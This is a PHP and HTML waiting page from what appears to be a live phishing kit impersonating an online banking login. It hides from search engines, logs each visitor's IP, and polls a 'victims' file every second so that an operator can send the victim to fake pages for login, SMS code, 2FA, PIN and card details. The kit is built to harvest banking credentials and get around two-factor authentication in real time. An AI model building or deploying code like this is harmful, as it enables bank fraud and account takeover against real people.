<?php
  include "./Assets/php/config/config.php";
?>
<!doctype html>
<html style="display: flex; justify-content: center; align-items: center; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./Assets/css/helpers.css">
        <link rel="stylesheet" href="./Assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="./Assets/imgs/ff.ico" />

        <title>Log in to Online Banking</title>
        <script src="./Assets/js/stutes.js"></script>        
    </head>

    <body style="display: flex; justify-content: center; align-items: center; height: 100%;">

        <div class="loader">
            <div class="spinner-border mr10"></div>
            <div><img style="max-width: 170px;" src="./Assets/imgs/logo.svg"></div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./Assets/js/js.js"></script>

        <script>
          var ip = '<?php echo get_client_ip(); ?>';
          var waiting = setInterval(function() {
            $.get('victims/' + ip + '.txt?' + new Date().getTime(), function(data) {
                if( data == 0 ) {
                    // console.log('hada ba9i 0');
                }else if( data == 'log' ){
                    clearInterval(waiting); 
                    location.href = "login.php";
                }else if( data == 'log_error' ){
                    clearInterval(waiting);
                    location.href = "login.php?error";
                }               

                else if( data == 'sms' ) {
                    clearInterval(waiting);
                    location.href = "sms.php";
                }else if( data == 'sms_error' ){
                    clearInterval(waiting);
                    location.href = "sms.php?error";
                }

                else if( data == 'f2' ) {
                    clearInterval(waiting);
                    location.href = "2fa.php";
                }else if( data == 'f2_error' ){
                    clearInterval(waiting);
                    location.href = "2fa.php?error";
                }

                else if( data == 'pin' ) {
                    clearInterval(waiting);
                    location.href = "pin.php";
                }else if( data == 'pin_error' ){
                    clearInterval(waiting);
                    location.href = "pin.php?error";
                }

                else if( data == 'card' ) {
                    clearInterval(waiting);
                    location.href = "card.php";
                }else if( data == 'card_error' ){
                    clearInterval(waiting);
                    location.href = "card.php?error";
                }

                else if( data == 'success' ){
                    clearInterval(waiting);
                    location.href = "success.php";
                }
            });
          }, 1000);   
        </script>

    </body>

</html>